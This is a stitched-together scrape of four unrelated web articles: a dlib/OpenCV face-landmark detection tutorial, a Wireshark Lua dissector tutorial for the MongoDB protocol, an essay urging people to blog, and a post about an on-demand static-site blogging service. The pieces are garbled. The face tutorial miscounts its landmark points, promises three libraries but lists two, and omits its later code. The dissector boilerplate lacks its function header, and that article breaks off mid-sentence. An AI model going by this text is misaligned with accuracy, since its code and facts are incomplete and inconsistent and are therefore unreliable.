                <img alt="Feature Image" src="https://livecodestream.dev/post/2020-07-03-detecting-face-features-with-python/featured_hub7f1feff188674cdc7b9240a8885c06f_146833_680x0_resize_q75_box.jpg">

            <p>Today we are going to learn how to work with images to detect faces and to extract facial features such as the eyes, nose, mouth, etc. There’s a number of incredible things we can do this information as a pre-processing step like capture faces for tagging people in photos (manually or through machine learning), create effects to “enhance” our images (similar to those in apps like Snapchat), do sentiment analysis on faces and much more.</p>
<p>In the past, we have covered before how to work with OpenCV to detect shapes in images, but today we will take it to a new level by introducing DLib, and abstracting face features from an image.</p>
<p><a href="https://livecodestream.dev/post/2020-06-11-essential-opencv-functions-to-get-you-started-into-computer-vision/">Essential OpenCV Functions to Get You Started into Computer Vision</a></p>
<p><a href="http://dlib.net/">Dlib</a> is an advanced machine learning library that was created to solve complex real-world problems. This library has been created using the C++ programming language and it works with C/C++, Python, and Java.</p>
<p>It worth noting that this tutorial might require some previous understanding of the OpenCV library such as how to deal with images, open the camera, image processing, and some little techniques.</p>
<hr>
<h2 id="how-does-itwork">How does it&nbsp;work?</h2>
<p>Our face has several features that can be identified, like our eyes, mouth, nose, etc. When we use DLib algorithms to detect these features we actually get a map of points that surround each feature.</p>
<p>This map composed of 67 points (called landmark points) can identify the following features:</p>

<ul>
<li>Jaw Points = 0–16</li>
<li>Right Brow Points = 17–21</li>
<li>Left Brow Points = 22–26</li>
<li>Nose Points = 27–35</li>
<li>Right Eye Points = 36–41</li>
<li>Left Eye Points = 42–47</li>
<li>Mouth Points = 48–60</li>
<li>Lips Points = 61–67</li>
</ul>
<p>Now that we know a bit about how we plan to extract the features, let’s start coding.</p>
<hr>
<h2 id="installing-requirements">Installing requirements</h2>
<p>As usual, this article will present examples with code, and I’ll guide you step by step to implement a fully working example of face feature recognition. But before we get started you need to start a new Python project and install 3 different libraries:</p>
<ul>
<li>opencv-python</li>
<li>dlib</li>
</ul>
<p>If you use pipenv like I do, you can install all of them with the following command:</p>
<div><pre><code data-lang="shell">pipenv install opencv-python, dlib
</code></pre></div><p>If you are working on Mac, and some versions of Linux you may have some problems installing dlib, if you get compiling errors during the installation make sure you check the CMake library version you are using. In Mac to make sure you have CMake available and with the right version you can run:</p>
<p>For other OS, check online for specific support.</p>
<hr>
<h2 id="step-1-loading-and-presenting-animage">Step 1: Loading and presenting an&nbsp;image</h2>
<p>We will start small and build on the code until we have a fully working example.</p>
<p>Normally I like to use plots to render the images, but since we have something cool prepared for later in the post, we will do something different, and we will create a window where we are going to show the results of our work.</p>
<p>Let’s jump into the code</p>
<div><pre><code data-lang="python"><span>import</span> cv2

<span># read the image</span>
img <span>=</span> cv2<span>.</span>imread(<span>"face.jpg"</span>)

<span># show the image</span>
cv2<span>.</span>imshow(winname<span>=</span><span>"Face"</span>, mat<span>=</span>img)

<span># Wait for a key press to exit</span>
cv2<span>.</span>waitKey(delay<span>=</span><span>0</span>)

<span># Close all windows</span>
cv2<span>.</span>destroyAllWindows()
</code></pre></div><p>Pretty simple, right? We are just loading the image with imread, and then telling OpenCV to show the image in a winname, this will open the window and give it a title.</p>
<p>After that, we need to pause execution, as the window will be destroyed when the script stops, so we use cv2.waitKey to hold the window until a key is pressed, and after that, we destroy the window and exit the script.</p>
<p>If you use the code and added an image named face.jpg to the code directory, you should get something like the following:</p>

<h2 id="step-2-face-recognition">Step 2: Face recognition</h2>
<p>So far we haven’t done anything with the image other than presenting it into a window, pretty boring, but now we will start coding the good stuff, and we will start by identifying where in the image there is a face.</p>
<p>For this, we will use Dlib function called <code>get_frontal_face_detector()</code>, pretty intuitive. There is a caveat though, this function will only work with grayscale images, so we will have to do that first with OpenCV.</p>
<p>The <code>get_frontal_face_detector()</code> will return a <code>detector</code> that is a function we can use to retrieve the faces information. Each face is an object that contains the points where the image can be found.</p>
<p>But let’s better see it on the code:</p>
<div><pre><code data-lang="python"><span>import</span> cv2
<span>import</span> dlib

<span># Load the detector</span>
detector <span>=</span> dlib<span>.</span>get_frontal_face_detector()

<span># read the image</span>
img <span>=</span> cv2<span>.</span>imread(<span>"face.jpg"</span>)

<span># Convert image into grayscale</span>
gray <span>=</span> cv2<span>.</span>cvtColor(src<span>=</span>img, code<span>=</span>cv2<span>.</span>COLOR_BGR2GRAY)

<span># Use detector to find landmarks</span>
faces <span>=</span> detector(gray)

<span>for</span> face <span>in</span> faces:
    x1 <span>=</span> face<span>.</span>left() <span># left point</span>
    y1 <span>=</span> face<span>.</span>top() <span># top point</span>
    x2 <span>=</span> face<span>.</span>right() <span># right point</span>
    y2 <span>=</span> face<span>.</span>bottom() <span># bottom point</span>
    <span># Draw a rectangle</span>
    cv2<span>.</span>rectangle(img<span>=</span>img, pt1<span>=</span>(x1, y1), pt2<span>=</span>(x2, y2), color<span>=</span>(<span>0</span>, <span>255</span>, <span>0</span>), thickness<span>=</span><span>4</span>)

<span># show the image</span>
cv2<span>.</span>imshow(winname<span>=</span><span>"Face"</span>, mat<span>=</span>img)

<span># Wait for a key press to exit</span>
cv2<span>.</span>waitKey(delay<span>=</span><span>0</span>)

<span># Close all windows</span>
cv2<span>.</span>destroyAllWindows()
</code></pre></div><p>The code above will retrieve all the faces from the image and render a rectangle over each face, resulting in an image like the following:</p>

<p>So far we did pretty well at finding the face, but we still need some work to extract all the features (landmarks). Let’s work on that next.</p>
<hr>
<h2 id="step-3-identifying-facefeatures">Step 3: Identifying face&nbsp;features</h2>
<p>Do you love magic? So far DLib has been pretty magical in the way it works, with just a few lines of code we could achieve a lot, and now we have a whole new problem, would it continue to be as easy?</p>
<p>The short answer is YES! Turns out DLib offers a function called <code>shape_predictor()</code> that will do all the magic for us but with a caveat, it needs a pre-trained model to work.</p>
<p>There are several models out there that work with <code>shape_predictor</code>, the one I’m using can be downloaded <a href="https://github.com/italojs/facial-landmarks-recognition/blob/master/shape_predictor_68_face_landmarks.dat">here</a>, but feel free to try others.</p>
<p>Let’s see how the new code looks like now</p>

<p>Amazing, but can we do something even cooler?</p>

<h2 id="step-4-real-time-detection">Step 4: Real-time detection</h2>
<p>Yes, you read it right! And yes it’s probably what you are thinking! The next step is to hook up our webcam and do real-time landmark recognition from your video stream.</p>
<p>You can do real-time facial landmarks detection on your face by iterating through video frames with your camera or use a video file. Refer to the code below if you want to use your own camera but for video file make sure to change the number 0 to video path.</p>

  <div itemprop="articleBody">
    <p>This post will explain how you can easily create <a href="https://wiki.wireshark.org/Lua/Dissectors">protocol dissectors</a>
in Wireshark, using the Lua programming language. This is can be useful when you’re working with
a custom protocol that Wireshark doesn’t already have a dissector for. If Wireshark looks like
this for example</p>

<p><img src="https://mika-s.github.io/assets/creating-wireshark-dissectors-1/before.png" alt="Wireshark without dissector"></p>

<p>it’s hard to tell what the various bytes in the data part represents.</p>

<p>Wireshark is written in C, and dissectors for Wireshark are generally also written in C. However,
Wireshark has a Lua implementation that makes it easy for people who are unfamiliar with C to write
dissectors. For those who are unfamiliar with Lua, it’s a very light-weight programming language
that is designed to be implemented as a scripting language in applications to extend their
functionality.</p>

<p>The downside of using Lua is that the dissector will be slower than a dissector written in C.</p>

<p>Before we start writing the dissector, let’s go through a crash course on Lua. It’s not important
to know the language in detail, but we must know the basics.</p>

<h3 id="lua-crash-course">Lua crash course</h3>

<ul>
  <li>Lua is multi-paradigm, and supports procedural style, functional programming to some degree, and
it also has some object-oriented programming features. It doesn’t have classes, prototypes or
inheritance out of the box, but they can be made by the programmer.</li>
  <li>It’s dynamically typed.</li>
  <li>Scope is either <code>local</code> or <code>global</code>. It’s global if you don’t declare it.</li>
  <li>Semicolons are not needed. Whitespace is not important like in Python.</li>
  <li>Lines that start with <code>--</code> are comments.</li>
  <li>Don’t use <code>++</code> or <code>+=</code>. Use <code>i = i + 1</code> instead.</li>
  <li>Not equal in conditionals is <code>~=</code> rather than <code>!=</code>.</li>
  <li>Its types are: string, number, boolean, nil, function, userdata, thread and table. Number
represents all numbers, both floating points and integers. Booleans are either true or false.
Strings are either single-quote or double-quote. You can forget about thread and userdata.</li>
  <li>nil is a non-value. A variable will have the value nil before it’s assigned a proper value.</li>
  <li>In conditionals: nil and false are falsy, the rest are thruthy.</li>
  <li>Lua has a type called <code>table</code>, which is also the only data structure it has. Tables implements
associative arrays. Associative arrays can be indexed by both numbers and other types, such as
strings. They have no fixed size and elements can be added dynamically. Tables are often called
objects. They are created like this:</li>
</ul>



<p>Values are assigned like this:</p>

<div><div><pre><code><span>new_table</span><span>[</span><span>20</span><span>]</span> <span>=</span> <span>10</span>
<span>new_table</span><span>[</span><span>"x"</span><span>]</span> <span>=</span> <span>"test"</span>
<span>a</span><span>.</span><span>x</span> <span>=</span> <span>10</span>                    <span>-- same as a["x"] = 10</span>
</code></pre></div></div>

<p>They can have functions and are generally very similar to objects in JavaScript.</p>

<ul>
  <li>Conditional branching looks like this:</li>
</ul>

<div><div><pre><code><span>if</span> <span>i</span> <span>==</span> <span>0</span> <span>then</span> <span>variable</span> <span>=</span> <span>200</span>
<span>elseif</span> <span>i</span> <span>==</span> <span>1</span> <span>then</span> <span>variable</span> <span>=</span> <span>300</span>
<span>else</span> <span>variable</span> <span>=</span> <span>400</span> <span>end</span>
</code></pre></div></div>

<ul>
  <li>Loops look like this:</li>
</ul>

<div><div><pre><code><span>while</span> <span>i</span> <span>&lt;</span> <span>10</span> <span>do</span>
  <span>i</span> <span>=</span> <span>i</span> <span>+</span> <span>1</span>
<span>end</span>
</code></pre></div></div>

<div><div><pre><code><span>for</span> <span>i</span> <span>=</span> <span>0</span><span>,</span> <span>10</span><span>,</span> <span>1</span> <span>do</span>
  <span>print</span><span>(</span><span>i</span><span>)</span>
<span>end</span>
</code></pre></div></div>

<p>That is <em>i = first</em>, <em>last</em>, <em>delta</em>. <code>break</code> can be used, but continue cannot.</p>

<ul>
  <li>Functions are declared like this:</li>
</ul>

<div><div><pre><code><span>function</span> <span>add</span><span>(</span><span>arg1</span><span>,</span> <span>arg2</span><span>)</span>
    <span>return</span> <span>arg1</span> <span>+</span> <span>arg2</span>
<span>end</span>
</code></pre></div></div>

<p>and are called like this:</p>

<div><div><pre><code><span>local</span> <span>added_number</span> <span>=</span> <span>add</span><span>(</span><span>2</span><span>,</span> <span>3</span><span>)</span>
</code></pre></div></div>

<p>If you see functions called like this:</p>



<p>then the functions <code>func1</code> and <code>func2</code> belongs to the table (object) <code>a</code>. Using colon is syntactic
sugar for passing the object itself as an argument to the function. That means <code>a:func1()</code> is
similar to <code>a.func1(a)</code>.</p>

<p>That’s the important stuff. You can read the <a href="https://www.lua.org/manual/5.3/">Lua 5.3 Reference Manual</a>
if you care about the details.</p>

<h3 id="setup">Setup</h3>

<p>If you go to Help –&gt; About Wireshark –&gt; Folders, you’ll find all the folders Wireshark reads Lua
scripts from. Choose either the Personal Lua Plugins, Global Lua Plugins or Personal configuration
folder. E.g. <em>C:\Program Files\Wireshark\plugins\2.4.2</em> on Windows. The script will be active when
Wireshark is started. You have to restart Wireshark after you do changes to the script, or reload
all the Lua scripts with <strong>Ctrl+Shift+L</strong>.</p>

<p>I’m using the latest version at the current date. What I’m doing here might not work on earlier
versions.</p>

<h3 id="the-protocol">The protocol</h3>

<p>The most interesting protocol to investigate in this post would probably be a custom one that
Wireshark doesn’t know of already, but all the custom protocols I’ve worked with have been work
related and I can’t post information about them here. So instead we’ll look at the
<a href="https://docs.mongodb.com/manual/reference/mongodb-wire-protocol/">MongoDB wire protocol</a>.</p>

<p><em>(There is already a <a href="https://wiki.wireshark.org/Mongo">Mongo dissector</a> in Wireshark, but I will not use that one.)</em></p>

<p>According to the specification linked to above, the MongoDB wire protocol is a TCP/IP protocol
using port number 27017. The byte ordering is little endian, meaning the least significant byte
comes first. Most protocols are big endian. The only difference is the ordering of the bytes. If
we had an int32 for example, with these bytes: <code>00 4F 23 11</code> in big endian, then the little endian
version would be <code>11 23 4F 00</code>. This is something must to take into account when writing the
dissector.</p>

<p>In this post, I’ll only take a look at the header of the protocol. It looks like this</p>

<p><img src="https://mika-s.github.io/assets/creating-wireshark-dissectors-1/mongodb-wire-protocol-header.png" alt="MongoDB protocol header"></p>

<p>We can see that it has four int32s, each containing 4 bytes, because 4*8 = 32.</p>

<h3 id="setting-up-the-boilerplate-code">Setting up the boilerplate code</h3>

<p>Let’s start by setting up some of the boilerplate code that’s needed in all dissectors:</p>

<div><div><pre><code><span>mongodb_protocol</span> <span>=</span> <span>Proto</span><span>(</span><span>"MongoDB"</span><span>,</span>  <span>"MongoDB Protocol"</span><span>)</span>

<span>mongodb_protocol</span><span>.</span><span>fields</span> <span>=</span> <span>{}</span>

  <span>if</span> <span>length</span> <span>==</span> <span>0</span> <span>then</span> <span>return</span> <span>end</span>

  <span>pinfo</span><span>.</span><span>cols</span><span>.</span><span>protocol</span> <span>=</span> <span>mongodb_protocol</span><span>.</span><span>name</span>

  <span>local</span> <span>subtree</span> <span>=</span> <span>tree</span><span>:</span><span>add</span><span>(</span><span>mongodb_protocol</span><span>,</span> <span>buffer</span><span>(),</span> <span>"MongoDB Protocol Data"</span><span>)</span>
<span>end</span>

<span>local</span> <span>tcp_port</span> <span>=</span> <span>DissectorTable</span><span>.</span><span>get</span><span>(</span><span>"tcp.port"</span><span>)</span>
<span>tcp_port</span><span>:</span><span>add</span><span>(</span><span>59274</span><span>,</span> <span>mongodb_protocol</span><span>)</span>
</code></pre></div></div>

<p>We start my creating a <a href="https://www.wireshark.org/docs/wsdg_html_chunked/lua_module_Proto.html#lua_class_Proto">Proto</a> (protocol) object and call it <code>mongodb_protocol</code>. The
table constructor takes two arguments: <code>name</code> and <code>description</code>. The protocol requires a <code>fields</code>
table and a dissector function. We haven’t added any fields yet, so the <code>fields</code> table is empty. The
dissector function is called once for every packet of our type.</p>

<p>The dissector function has three parameters: <code>buffer</code>, <code>pinfo</code> and <code>tree</code>. <code>buffer</code> contains the
packet’s buffer and is a <a href="https://www.wireshark.org/docs/wsdg_html_chunked/lua_module_Tvb.html#lua_class_Tvb">Tvb object</a>. It contains the data we want to dissect. <code>pinfo</code>
contains the columns of the packet list and is a <a href="https://www.wireshark.org/docs/wsdg_html_chunked/lua_module_Pinfo.html#lua_class_Pinfo">Pinfo object</a>. Finally, <code>tree</code> is
the tree root and is a <a href="https://www.wireshark.org/docs/wsdg_html_chunked/lua_module_Tree.html#lua_class_TreeItem">TreeItem object</a>.</p>

<p><img src="https://mika-s.github.io/assets/creating-wireshark-dissectors-1/columns.png" alt="Columns in packet list "></p>

<p><img src="https://mika-s.github.io/assets/creating-wireshark-dissectors-1/tree.png" alt="Tree in packet details pane"></p>

<p>Inside the dissector function, we start by checking the length of the buffer and then returning if
it’s empty.</p>

<p>As mentioned before, the <code>pinfo</code> object contains the columns in the packet list. We can use it to
set the protocol name when we receive a packet of MongoDB type. On the script’s first line we set
the name of the protocol to be “MongoDB” (by passing the name to the constructor). We set the
protocol column name here</p>

<div><div><pre><code><span>pinfo</span><span>.</span><span>cols</span><span>.</span><span>protocol</span> <span>=</span> <span>mongodb_protocol</span><span>.</span><span>name</span>
</code></pre></div></div>

<p>and the protocol column name changes from TCP to MONGODB:</p>

<p><img src="https://mika-s.github.io/assets/creating-wireshark-dissectors-1/protocol-column.png" alt="Packet list protocol column"></p>

<p>We must then create a sub tree in the tree structure found in the Packet Details pane. It done by
adding an additional tree item to the tree object that was passed as an argument to the dissector
function.</p>

<div><div><pre><code><span>local</span> <span>subtree</span> <span>=</span> <span>tree</span><span>:</span><span>add</span><span>(</span><span>mongodb_protocol</span><span>,</span> <span>buffer</span><span>(),</span> <span>"MongoDB Protocol Data"</span><span>)</span>
</code></pre></div></div>

<p>The string is the name of the sub tree. Without having added any fields it will look like this:</p>

<p><img src="https://mika-s.github.io/assets/creating-wireshark-dissectors-1/packet-pane-1.png" alt="Packet pane with MongoDB but without fields"></p>

<p>Finally, we must assign the protocol to a port. In my case, I’ll use port 59274, because that’s the
port I use to connect to the Mongo database.</p>

<div><div><pre><code><span>local</span> <span>tcp_port</span> <span>=</span> <span>DissectorTable</span><span>.</span><span>get</span><span>(</span><span>"tcp.port"</span><span>)</span>
<span>tcp_port</span><span>:</span><span>add</span><span>(</span><span>59274</span><span>,</span> <span>mongodb_protocol</span><span>)</span>
</code></pre></div></div>

<p><code>"udp.port"</code> can also be used, if the protocol uses UDP rather than TCP.</p>

<h3 id="adding-fields">Adding fields</h3>

<p>The script already runs at this stage, but it isn’t doing anything useful. For the script to do
something useful we have to add the fields that we want to parse. Fields are made by creating
<a href="https://www.wireshark.org/docs/wsdg_html_chunked/lua_module_Proto.html#lua_class_ProtoField">ProtoField</a> objects. We can start off simple by adding only the first field.
The first field in the MongoDB wire protocol specification is the message length, which is an int32.</p>

<div><div><pre><code><span>mongodb_protocol</span> <span>=</span> <span>Proto</span><span>(</span><span>"MongoDB"</span><span>,</span>  <span>"MongoDB Protocol"</span><span>)</span>

<span>message_length</span> <span>=</span> <span>ProtoField</span><span>.</span><span>int32</span><span>(</span><span>"mongodb.message_length"</span><span>,</span> <span>"messageLength"</span><span>,</span> <span>base</span><span>.</span><span>DEC</span><span>)</span>

<span>mongodb_protocol</span><span>.</span><span>fields</span> <span>=</span> <span>{</span> <span>message_length</span> <span>}</span>

<span>function</span> <span>mongodb_protocol</span><span>.</span><span>dissector</span><span>(</span><span>buffer</span><span>,</span> <span>pinfo</span><span>,</span> <span>tree</span><span>)</span>
  <span>length</span> <span>=</span> <span>buffer</span><span>:</span><span>len</span><span>()</span>
  <span>if</span> <span>length</span> <span>==</span> <span>0</span> <span>then</span> <span>return</span> <span>end</span>

  <span>pinfo</span><span>.</span><span>cols</span><span>.</span><span>protocol</span> <span>=</span> <span>mongodb_protocol</span><span>.</span><span>name</span>

  <span>local</span> <span>subtree</span> <span>=</span> <span>tree</span><span>:</span><span>add</span><span>(</span><span>mongodb_protocol</span><span>,</span> <span>buffer</span><span>(),</span> <span>"MongoDB Protocol Data"</span><span>)</span>

  <span>subtree</span><span>:</span><span>add_le</span><span>(</span><span>message_length</span><span>,</span> <span>buffer</span><span>(</span><span>0</span><span>,</span><span>4</span><span>))</span>
<span>end</span>

<span>local</span> <span>tcp_port</span> <span>=</span> <span>DissectorTable</span><span>.</span><span>get</span><span>(</span><span>"tcp.port"</span><span>)</span>
<span>tcp_port</span><span>:</span><span>add</span><span>(</span><span>59274</span><span>,</span> <span>mongodb_protocol</span><span>)</span>
</code></pre></div></div>

<p>We add the following above the dissector function:</p>

<div><div><pre><code><span>message_length</span> <span>=</span> <span>ProtoField</span><span>.</span><span>int32</span><span>(</span><span>"mongodb.message_length"</span><span>,</span> <span>"messageLength"</span><span>,</span> <span>base</span><span>.</span><span>DEC</span><span>)</span>
</code></pre></div></div>

<p>The first argument is used as a label in the filter settings, second is used as a label in the sub
tree and the last is used to decide how the variable’s value should be displayed. In this case I
want to show the value in decimal, but I could also use <code>base.HEX</code> to show it in hexadecimal format.
Hexadecimal format doesn’t work for int32 though.</p>

<p><code>ProtoField</code> has several types of functions we can use: <code>uint8()</code>, <code>uint16()</code>, <code>string()</code> and so on.
We have to use the one that matches the specification. A list of all the functions can be found
<a href="https://www.wireshark.org/docs/wsdg_html_chunked/lua_module_Proto.html#lua_fn_ProtoField_char_abbr___name____base____valuestring____mask____desc__">here</a>.</p>

<p>We then add the field to the <code>fields</code> table of the protocol:</p>

<div><div><pre><code><span>mongodb_protocol</span><span>.</span><span>fields</span> <span>=</span> <span>{</span> <span>message_length</span> <span>}</span>
</code></pre></div></div>

<p>and finally add the field to the sub tree:</p>

<div><div><pre><code><span>subtree</span><span>:</span><span>add_le</span><span>(</span><span>message_length</span><span>,</span> <span>buffer</span><span>(</span><span>0</span><span>,</span><span>4</span><span>))</span>
</code></pre></div></div>

<p>I use <code>add_le</code> rather than <code>add</code>, because we are working with a little-endian protocol. If the
protocol was big endian we would have to use <code>add</code>. The function takes two arguments: the field we
made further up, and a <a href="https://www.wireshark.org/docs/wsdg_html_chunked/lua_module_Tvb.html#lua_class_TvbRange">buffer range</a>. We can get a range of the buffer by using
the range function that is a part of the buffer object. <code>buffer(offset,length)</code> is the short form
for the range function. <code>buffer(0,4)</code> means we want to start at the first byte, and then take 4
bytes. The reason we want to start at 0 is because we’re dealing with the first field in the header.
We take 4 bytes because that is the size of an int32.</p>

<p>After reloading the Lua script with <strong>Ctrl+Shift+L</strong> Wireshark should look like this:</p>

<p><img src="https://mika-s.github.io/assets/creating-wireshark-dissectors-1/messageLength-added.png" alt="Message length added to sub tree"></p>

<p>We can see that it parses the messageLength correctly. We can also see that we don’t …</p></div></article></div></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article itemprop="articleBody"> <center> <img src="https://media.giphy.com/media/pOZhmE42D1WrCWATLK/giphy.gif"> </center><p>If you ever told me you are learning to code (or anything, really), chances are I told you you should have your blog and write in it. Although I discussed this topic in person with a lot of people, there are only small texts about it on blog posts I wrote about other topics (<a href="https://leportella.com/my-experience-with-blogs.html">[1]</a>, <a href="https://leportella.com/boosting-your-career.html">[2]</a>). This blog post is dedicated to <em>why you should have your own (independent) blog</em>. Because people have different ways of seeing the world I divided it into two sections of <em>why:</em></p><ul><li><a href="#philosophical-reasons">Philosophical reasons to have a blog</a></li><li><a href="#selfish-reasons">Selfish reasons to have a blog</a></li></ul><p>I also wrote a section on <a href="#excuses">common excuses</a> that people give me to not write a blog post and my answers to them!</p><p>And finally, if you are convinced, there is a section dedicated to <a href="#what"><em>what</em> to write about</a>.</p><h2 id="philosophical-reasons">Philosophical reasons to have a blog</h2><h3 id="you-should-have-your-own-place-in-the-internet">You should have your own place in the internet</h3><p>If you notice, the internet of today is basically made of a couple of big websites that try to gather every content there is. Have you ever talked to an older person that thinks Facebook IS the internet? Yes, that’s exactly what I am talking about.</p><p>Having your <em>independent</em> blog is an excellent way to share what you think in a decentralized way, independent of any major company that may add a paywall to it (Medium, I am looking at you). On his post “<a href="https://ramalho.org/wiki/doku.php?id=porque_cada_pessoa_deve_ter_seu_site_na_web">why every person should have their own website on the internet</a>”, <a href="https://ramalho.org/">Luciano Ramalho</a> writes something that summarizes what I think:</p><blockquote><p><em>“If everybody starts to create their own website, we will start the long and essential process of taking back the control of the Web: the Web is ours to use it as we like, and not to be controlled by half dozen of mega industries with their opaques algorithms.”</em></p></blockquote><p>Writing is a way of sharing knowledge and a way to increase opportunities for learning to other people. Not everyone had access to a good university or the best books available. Sharing things you have learned can help others grow, can help change their lives and relate to your story or learn with you. Of course, not everyone has access to the internet, but it a good way of starting something for a greater good.</p><p>If you come from a country whose first language is not English, you can create opportunities for people that didn’t have the opportunity to learn that language! The best content is usually written in English, but for third world countries, learning English is quite a privilege, so imagine the impact of writing good content on your language!</p><h3 id="each-person-should-drive-their-presence-on-the-internet">Each person should drive their presence on the internet</h3><p>More and more it becomes really hard to stay away from the internet and social media. It is important to create a digital presence that associates your name to good things and to what <em>you</em> want your name to be associated with. Creating a blog and sharing what you know is an excellent way to position yourself online, and making sure people know you for something better than just social media.</p><h2 id="selfish-reasons">Selfish reasons to have a blog</h2><h3 id="writing-as-a-tool-for-learning">Writing as a tool for learning</h3><p>Writing is an excellent tool for learning. When you decide to write a blog post about what you are learning, not only you need to understand it well enough to make it clear, but also you need to create a structure for the post, which helps you structure your studies in the meantime.</p><p>Let’s take <a href="https://leportella.com/julia-language.html">my blog post about the Julia Language</a> as example. I needed to study the language for an episode of my podcast. After a couple of lines of code, I thought it was good enough, but then I decided to write the post. After that, I realized so much I haven’t studied yet! Who created the language and why? What is considered the best feature of the language? How can I integrate with Jupyter notebooks? And so on. I spent a few more hours understanding the language in order to create the post and this experience was so much better than just following some tutorial and write some lines of code.</p><p><strong>Practice leads to perfection</strong> Like anything in life, you can only get better if you practice. Your first blog post will probably not be great, nor your second, maybe not even your third. But you should write them anyway. The more you write, the more you can improve your writing. You will need to read other blog posts and articles and incorporate different ways of writing to your own. You can only be a good writer, if you practice. So… practice on your own blog!</p><h3 id="feedback-is-a-gift">Feedback is a gift!</h3><p>If you are insecure about writing a blog post, you can share it with your friend and ask for feedback! It is an excellent way of improving your writing while you are developing your skills. So use this opportunity to learn how to take constructive criticism. It is important to understand that feedback is a gift, and that a person took time from their lives and gave you feedback to help you improve. So use your blog posts to get feedback from your friends (and even people that comment on your posts) and learn how to grow through it. You can only gain from it!</p><h3 id="build-your-career">Build your career</h3><p>In today’s world, being visible is an excellent way to stand out and get better jobs in better companies. In tech there are several ways of doing this, you can organize meetups, give talks in conferences, have a Youtube channel, a podcast, etc. However, not everyone wants or is comfortable with this kind of exposure. In my opinion, a blog is the best way of share your work with minimal personal exposure. You don’t even need to add a personal photo to have one! You can improve your career even if you are too shy to give a talk 😉</p><h2 id="excuses">Common excuses not to write</h2><table><thead><tr><th><strong>Excuse</strong></th><th><strong>My answer</strong></th></tr></thead><tbody><tr><td>“I am not an expert”</td><td>That’s ok! You don’t have to be an expert to explain something you know! On every blog post that I am not completely sure of what I am writing I make it explicit that this is based on my knowledge. Just make sure to be open to criticism and feedback.</td></tr><tr><td>“Everybody know this”</td><td>Even if something was written a thousand times, it doesn’t mean you shouldn’t write about it. I usually search for different articles on a single topic to help me understand something! Not always what was written before works for everyone. Maybe what you wrote will be good for a specific person. And that’s all you need</td></tr><tr><td>“What if I make mistakes?”</td><td>No problem at all. Life is full of mistakes. Make sure you add a comment on the beginning of an old post or even change the text. You don’t have to be right all the time and you didn’t write in stone. If you make a mistake, go back and fix it. You will only grow from the experience</td></tr><tr><td>“I have nothing to write about”</td><td>I made a whole section about it 😉</td></tr></tbody></table><h2 id="what">What to write?</h2><p>If you are here I am assuming I was able to convince you to start blogging! Congratulations! That’s a huge step! Here are the topics you can write about (based on my personal experience):</p><ul><li><strong>You can share a part of your life that was important to you and that can be used as inspiration by others!</strong><ul><li>Example: <a href="https://leportella.com/from-oceanographer-to-programmer.html">I wrote about how I changed careers from oceanographer to developer</a> and how hard that decision was.</li></ul></li><li><strong>When you see something online (like a Twitter thread) that talks about something that deserves to be more than a transient topic in someone’s timeline</strong><ul><li>Example: One guy asked on Twitter for arguments he could use to convince his company to engage in a tech community. The answers were so amazing that I thought it would give <a href="https://leportella.com/why-you-should-be-in-communities.html">an excellent blog post</a>!</li></ul></li><li><strong>When you want to study something and want to structure your thoughts</strong><ul><li>Example: <a href="https://leportella.com/julia-language.html">I wrote a blog post about Julia language</a> so I would know the minimum of the language to interview a guest on my podcast. Without the blog post, I was through with my studies after a couple of lines of code, but when I decided to write a blog post about it I realized how much I was missing and started all over!</li></ul></li><li><strong>When you had some interesting experience</strong><ul><li>Example: <a href="https://leportella.com/new-eng-stripe.html">my first 6 months at Stripe</a> were a surreal experience that I loved! It was something so different from what I have lived as an onboarding experience so far that I thought it was an amazing thing to share with my friends.</li></ul></li><li><strong>When it took you more than an hour to find an answer for a problem</strong><ul><li>Example: I needed to add a relationship model to an SQLAlchemy table that already existed. This problem took me 3 days and I asked for help from multiple people. The final answer was <em>extremely</em> simple, but <a href="https://leportella.com/relationship-sqlalchemy.html">I decided to write it anyway</a>. A couple of months ago someone commented that I saved their day because of my blog post.</li></ul></li><li><strong>When it took you more than 5 minutes to answer a question someone made you</strong><ul><li>Example: One time a guy came to my Telegram and asked me: “should I have my blog in Medium or somewhere else?” My answer to him was long and detailed and took me several minutes, so <a href="https://leportella.com/my-experience-with-blogs.html">I decided to write about it on a blog post</a>.</li></ul></li></ul><hr><p>Hope you enjoyed the post and let me know if you started a blog after reading it!

July 17, 2020 | https://longtweet.io/3hiz8afxa | <a href="https://web.archive.org/web/*/https://longtweet.io/3hiz8afxa">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><p>How do you make a highly scalable, highly performant blogging service for as little server cost as possible?</p>
<p>On-demand static site generation.</p>
<hr>
<p>Recently on Twitter, <a href="https://twitter.com/search?q=tl.gd&amp;src=typed_query">I've seen a lot of people use TwitLonger</a>. TwitLonger is a site separate from Twitter that lets users log in with their Twitter account and create longer, more traditional blog-style type of posts.</p>
<p>TwitLonger is a free-to-use service, however, it's littered with ads to pay for the server maintenance costs. TwitLonger is a self-funded project run by <a href="https://twitter.com/stuartgibson">one person</a>, so I mostly believe their claim that the ads are required to keep the site alive.</p>
<p>Oh also: TwitLonger is also <a href="https://twitter.com/twitlonger/status/18896126622?s=20">well over 10 years old</a> (crazy)!</p>
<p>Given that, the question that comes in mind is: <strong>Can we make a TwitLonger alternative that is ad-free in the year 2020?</strong></p>
<p>Short answer: yes! — via on-demand static site generation (SSG).</p>
<h2>The JAMstack</h2>
<p>In case you've haven't been paying attention to recent trends in web development, many engineering teams have been adopting the "JAM stack" — short for javascript, APIs, and markup.</p>
<p>The name and the components of that "stack" aren't really important. In fact, I would say it's less of an actual stack and more of general architecture philosophy that exploits one thing:</p>
<p>How cheap and fast it is to serve static assets over a CDN.</p>
<p>With the JAMstack, you pre-render all your site's pages to static HTML during build time so that the resulting assets of your site are primarily static HTML pages. When content changes, the site is simply re-built.</p>
<p>The end result is extremely performant and scalable websites that cost near nothing to host.</p>
<h2>Taking the JAMstack further: On-demand SSG</h2>
<p>For a user-generated blog site like TwitLonger, the JAMstack in this traditional sense won't work. There will be a point when re-building the whole site (even with an incremental approach) isn't feasible and another technique is needed.</p>
<p>So what do we do now?</p>
<p>Instead of re-rendering the whole site, we pre-render a single static HTML page on each new post. The resulting HTML page can then be saved in some storage bucket and served over CDN.</p>
<p>That's what on-demand SSG is — at the point in time when a user creates content, pre-render it.</p>
<p>If hooked up correctly, this approach does not require <em>any</em> backend code in order for the page to be viewed and scales extremely well.</p>
<h2>The implementation —&nbsp;<a href="http://longtweet.io/">longtweet.io</a></h2>
<p>You're looking at it.</p>
